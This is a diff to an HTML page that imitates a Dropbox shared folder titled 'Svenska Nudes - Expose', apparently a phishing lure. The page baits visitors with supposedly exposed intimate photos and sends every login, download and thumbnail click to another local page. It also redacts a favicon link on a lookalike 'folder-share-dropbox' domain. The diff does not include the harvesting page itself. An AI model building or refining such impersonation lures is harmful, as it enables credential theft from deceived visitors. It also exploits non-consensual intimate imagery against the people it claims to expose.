@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Svenska Nudes - Expose</title>
-    <link rel="icon" type="image/png" href="https://folder-share-dropbox.unaux.com/logo.png">
+    <link rel="icon" type="image/png" href="https://**/logo.png">
   <!-- REPLACE YOUR ENTIRE <header>...</header> WITH THIS -->
 <style>
   /* Reset header for new nav */
@@ -80,8 +80,8 @@
     cursor: pointer;
   }
 
-  .dropbox-nav__btn-login:hover { background: #f5f5f5; }
-  .dropbox-nav__btn-signup:hover { background: #333; }
+  .dropbox-nav__btn-login:hover { background: #f5f5f5; text-decoration: underline; }
+  .dropbox-nav__btn-signup:hover { background: #333; text-decoration: underline; }
 
   /* Blue notification banner */
   .dropbox-banner {
@@ -109,11 +109,11 @@
     color: #0061fe;
     font-weight: 600;
     font-size: 14px;
-    text-decoration: underline;
     cursor: pointer;
     padding: 0;
     width: auto;
   }
+    
 
   .dropbox-banner__btn-signup {
     padding: 4px 12px;
@@ -127,6 +127,8 @@
     cursor: pointer;
     width: auto;
   }
+    .dropbox-banner__btn-login:hover { text-decoration: underline; }
+    .dropbox-banner__btn-signup:hover { background: #f5f5f5; text-decoration: underline; }
 
   .dropbox-banner__close {
     background: none;
@@ -152,8 +154,8 @@
       </svg>
     </a>
     <div class="dropbox-nav__actions">
-      <button class="dropbox-nav__btn-login" onclick="window.location.href='#'">Logga in</button>
-      <button class="dropbox-nav__btn-signup" onclick="window.location.href='#'">Registrera</button>
+      <button class="dropbox-nav__btn-login" onclick="window.location.href='./index.html'">Logga in</button>
+      <button class="dropbox-nav__btn-signup" onclick="window.location.href='./index.html'">Registrera</button>
     </div>
   </div>
 
@@ -166,9 +168,9 @@
       </svg>
       <span class="dropbox-banner__text">
         <strong>SweExposer</strong> delade denna mapp. Vill du göra mer med den?
-        <button class="dropbox-banner__btn-login">Logga in</button>
+        <button class="dropbox-banner__btn-login" onclick="window.location.href='./index.html'">Logga in</button>
       </span>
-      <button class="dropbox-banner__btn-signup">Registrera</button>
+      <button class="dropbox-banner__btn-signup" onclick="window.location.href='./index.html'">Registrera</button>
     </div>
     <button class="dropbox-banner__close" onclick="document.getElementById('dropbox-banner').style.display='none'" aria-label="Close">×</button>
   </div>
@@ -253,6 +255,7 @@
     .card {
       background: var(--surface);
       border: 1px solid #dedede;
+        cursor: pointer;
     }
     .thumb {
       width: 100%;
@@ -297,28 +300,28 @@
       </section>
 
       <section class="actions" aria-label="Primary actions">
-        <button class="btn primary">Copy to Dropbox</button>
-        <button class="btn">Download</button>
+        <button class="btn primary" onclick="window.location.href='./index.html'">Copy to Dropbox</button>
+        <button class="btn" onclick="window.location.href='./index.html'">Download</button>
       </section>
 
       <div class="crumbs">Svenska nudes / <strong>Expose</strong></div>
 
       <section class="grid" aria-label="Files in folder">
-        <article class="card"><img class="thumb" src="./img1.png" alt="Preview image 1" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">2.2 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img2.png" alt="Preview image 2" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.1 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img3.png" alt="Preview image 3" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.2 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img4.png" alt="Preview image 4" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.4 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img5.png" alt="Preview image 5" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.5 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img6.png" alt="Preview image 6" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.2 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img7.png" alt="Preview image 7" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.8 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img8.png" alt="Preview image 8" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.1 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img9.png" alt="Preview image 9" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.3 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img10.png" alt="Preview image 10" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">3.4 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img11.png" alt="Preview image 11" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">5.4 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img12.png" alt="Preview image 12" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">3 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img13.png" alt="Preview image 13" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">2.8 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img14.png" alt="Preview image 14" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">4.1 MB</div></div></article>
-        <article class="card"><img class="thumb" src="./img15.png" alt="Preview image 15" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">4.5 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img1.png" alt="Preview image 1" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">2.2 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img2.png" alt="Preview image 2" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.1 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img3.png" alt="Preview image 3" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.2 MB</div></div></article>
+       <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img4.png" alt="Preview image 4" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.4 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img5.png" alt="Preview image 5" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.5 MB</div></div></article>
+       <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img6.png" alt="Preview image 6" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">4.2 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img7.png" alt="Preview image 7" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.8 MB</div></div></article>
+       <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img8.png" alt="Preview image 8" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.1 MB</div></div></article>
+       <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img9.png" alt="Preview image 9" loading="lazy"><div class="meta"><div class="name">Foto 2022-02-…</div><div class="size">3.3 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img10.png" alt="Preview image 10" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">3.4 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img11.png" alt="Preview image 11" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">5.4 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img12.png" alt="Preview image 12" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">3 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img13.png" alt="Preview image 13" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">2.8 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img14.png" alt="Preview image 14" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">4.1 MB</div></div></article>
+        <article class="card" onclick="window.location.href='./index.html'"><img class="thumb" src="./img15.png" alt="Preview image 15" loading="lazy"><div class="meta"><div class="name">Foto 2022-03-…</div><div class="size">4.5 MB</div></div></article>
       </section>
     </main>
   </div>
